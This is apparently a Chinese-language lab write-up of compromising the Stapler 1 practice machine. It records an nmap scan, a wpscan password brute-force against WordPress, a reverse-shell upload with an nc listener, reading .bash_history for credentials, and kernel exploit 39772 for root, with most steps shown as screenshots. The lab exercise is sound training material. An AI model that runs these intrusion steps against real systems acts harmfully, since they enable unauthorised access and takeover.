---
# 这是页面的图标
icon: api
# 这是文章的标题
title: 靶机 Stapler 1 Walkthrough
# 设置作者
author: lhz
# 设置写作时间
time: 2022-04-02
# 一个页面只能有一个分类
category: 渗透
# 一个页面可以有多个标签
tag:
  - 渗透
  - 靶机
comment: false

typora-root-url: ..\..\..\.vuepress\public
---



## 0x01 扫描



首先扫描靶机ip

![image-20220421173254135](/assets/img/image-20220421173254135.png)

发现靶机ip `192.168.56.101`



进一步扫描 `nmap -T5 -A -v -p- 192.168.56.101`

```bash
┌──(kali㉿kali)-[~]
└─$ nmap -T5 -A -v -p- 192.168.56.101
Starting Nmap 7.92 ( https://nmap.org ) at 2022-03-02 03:27 EST
NSE: Loaded 155 scripts for scanning.
NSE: Script Pre-scanning.
Initiating NSE at 03:27
Completed NSE at 03:27, 0.00s elapsed
Initiating NSE at 03:27
Completed NSE at 03:27, 0.00s elapsed
Initiating NSE at 03:27
Completed NSE at 03:27, 0.00s elapsed
Initiating Ping Scan at 03:27
Scanning 192.168.56.101 [2 ports]
Completed Ping Scan at 03:27, 0.00s elapsed (1 total hosts)
mass_dns: warning: Unable to determine any DNS servers. Reverse DNS is disabled. Try using --system-dns or specify valid servers with --dns-servers
Initiating Connect Scan at 03:27
Scanning 192.168.56.101 [65535 ports]
Discovered open port 3306/tcp on 192.168.56.101
Discovered open port 139/tcp on 192.168.56.101
Discovered open port 22/tcp on 192.168.56.101
Discovered open port 80/tcp on 192.168.56.101
Discovered open port 53/tcp on 192.168.56.101
Discovered open port 21/tcp on 192.168.56.101
Connect Scan Timing: About 46.58% done; ETC: 03:28 (0:00:36 remaining)
Discovered open port 12380/tcp on 192.168.56.101
Discovered open port 666/tcp on 192.168.56.101
Completed Connect Scan at 03:28, 53.02s elapsed (65535 total ports)
Initiating Service scan at 03:28
Scanning 8 services on 192.168.56.101
Completed Service scan at 03:28, 11.06s elapsed (8 services on 1 host)
NSE: Script scanning 192.168.56.101.
Initiating NSE at 03:28
NSE: [ftp-bounce] Couldn't resolve scanme.nmap.org, scanning 10.0.0.1 instead.
NSE: [ftp-bounce] PORT response: 500 Illegal PORT command.
Completed NSE at 03:29, 30.87s elapsed
Initiating NSE at 03:29
Completed NSE at 03:29, 0.03s elapsed
Initiating NSE at 03:29
Completed NSE at 03:29, 0.00s elapsed
Nmap scan report for 192.168.56.101
Host is up (0.00043s latency).
Not shown: 65523 filtered tcp ports (no-response)
PORT      STATE  SERVICE     VERSION
20/tcp    closed ftp-data
21/tcp    open   ftp         vsftpd 2.0.8 or later
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_Can't get directory listing: PASV failed: 550 Permission denied.
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to 192.168.56.102
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 3
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp    open   ssh         OpenSSH 7.2p2 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 81:21:ce:a1:1a:05:b1:69:4f:4d:ed:80:28:e8:99:05 (RSA)
|   256 5b:a5:bb:67:91:1a:51:c2:d3:21:da:c0:ca:f0:db:9e (ECDSA)
|_  256 6d:01:b7:73:ac:b0:93:6f:fa:b9:89:e6:ae:3c:ab:d3 (ED25519)
53/tcp    open   domain      dnsmasq 2.75
| dns-nsid: 
|_  bind.version: dnsmasq-2.75
80/tcp    open   http        PHP cli server 5.5 or later
|_http-title: 404 Not Found
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
123/tcp   closed ntp
137/tcp   closed netbios-ns
138/tcp   closed netbios-dgm
139/tcp   open   netbios-ssn Samba smbd 4.3.9-Ubuntu (workgroup: WORKGROUP)
666/tcp   open   tcpwrapped
3306/tcp  open   mysql       MySQL 5.7.12-0ubuntu1
| mysql-info: 
|   Protocol: 10
|   Version: 5.7.12-0ubuntu1
|   Thread ID: 9
|   Capabilities flags: 63487
|   Some Capabilities: Speaks41ProtocolNew, LongPassword, ConnectWithDatabase, SupportsCompression, Speaks41ProtocolOld, DontAllowDatabaseTableColumn, SupportsLoadDataLocal, SupportsTransactions, IgnoreSpaceBeforeParenthesis, IgnoreSigpipes, FoundRows, InteractiveClient, ODBCClient, LongColumnFlag, Support41Auth, SupportsMultipleResults, SupportsAuthPlugins, SupportsMultipleStatments
|   Status: Autocommit
|   Salt: (V\x7F\x05uR.0\x08#n1W
| +E\x17-\x04\x19
|_  Auth Plugin Name: mysql_native_password
12380/tcp open   http        Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Tim, we need to-do better next year for Initech
Service Info: Host: RED; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
| smb2-time: 
|   date: 2022-03-02T16:28:38
|_  start_date: N/A
|_clock-skew: mean: 7h59m58s, deviation: 0s, median: 7h59m57s
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.3.9-Ubuntu)
|   Computer name: red
|   NetBIOS computer name: RED\x00
|   Domain name: \x00
|   FQDN: red
|_  System time: 2022-03-02T16:28:38+00:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled but not required
| nbstat: NetBIOS name: RED, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| Names:
|   RED<00>              Flags: <unique><active>
|   RED<03>              Flags: <unique><active>
|   RED<20>              Flags: <unique><active>
|   \x01\x02__MSBROWSE__\x02<01>  Flags: <group><active>
|   WORKGROUP<00>        Flags: <group><active>
|   WORKGROUP<1d>        Flags: <unique><active>
|_  WORKGROUP<1e>        Flags: <group><active>

NSE: Script Post-scanning.
Initiating NSE at 03:29
Completed NSE at 03:29, 0.00s elapsed
Initiating NSE at 03:29
Completed NSE at 03:29, 0.00s elapsed
Initiating NSE at 03:29
Completed NSE at 03:29, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 95.52 seconds

```

## 0x02 渗透

发现80端口，尝试访问，没什么内容

![image-20220421173305384](/assets/img/image-20220421173305384.png)

12380端口运行的也是web服务，尝试访问，发现网页

![image-20220421173309645](/assets/img/image-20220421173309645.png)

使用nikto扫描

![image-20220421173317372](/assets/img/image-20220421173317372.png)

发现路径`/admin112233/`， `/blogblog/`，网站还使用了SSL，使用https访问发现路径

访问https://192.168.56.101:12380/blogblog/后，发现是wordpress

![image-20220421173323439](/assets/img/image-20220421173323439.png)

使用wpscan扫描

`wpscan --url https://192.168.56.101:12380/blogblog/ --enumerate u  --disable-tls-checks`

![image-20220421173328811](/assets/img/image-20220421173328811.png)

尝试爆破用户密码

`wpscan --url https://192.168.56.101:12380/blogblog/ --usernames John Smith --passwords /usr/share/wordlists/rockyou.txt --disable-tls-checks`

爆破成功

![image-20220421173335081](/assets/img/image-20220421173335081.png)

使用账号密码登录，发现刚好是管理员

`设备问题，重装虚拟机后，靶机ip变为192.168.56.103`

访问靶机上传插件保存位置发现可以访问`https://192.168.56.103:12380/blogblog/wp-content/uploads/`

添加新插件，上传反弹shell，需要验证ftp，可以不继续操作，shell已经上传成功

![image-20220421173341612](/assets/img/image-20220421173341612.png)

![image-20220421173346277](/assets/img/image-20220421173346277.png)

kali使用nc监听`nc -nlvp 4444`，反弹成功，拿到shell

![image-20220421173351863](/assets/img/image-20220421173351863.png)

当前用户`www-data`,下一步尝试提权

# 0x03 提权

## 提权1

查看home下的文件，未发现特殊文件，查看shell历史命令`cat */.bash_history`，发现peter用户ssh密码

![image-20220421173357083](/assets/img/image-20220421173357083.png)

使用ssh连接

![image-20220421173401990](/assets/img/image-20220421173401990.png)

使用sudo -l发现peter拥有所有命令root权限，使用sudo -i，输入密码，获得root权限

![image-20220421173407178](/assets/img/image-20220421173407178.png)



## 提权2

查看Linux版本

![image-20220421173412061](/assets/img/image-20220421173412061.png)

根据版本搜索漏洞

![image-20220421173418281](/assets/img/image-20220421173418281.png)

使用39772提权

![image-20220421173422671](/assets/img/image-20220421173422671.png)

下载exp，启动http服务

![image-20220421173427463](/assets/img/image-20220421173427463.png)

靶机下载，编译运行exp，获得root权限

![image-20220421173431729](/assets/img/image-20220421173431729.png)

![image-20220421173438592](/assets/img/image-20220421173438592.png)

![image-20220421173443305](/assets/img/image-20220421173443305.png)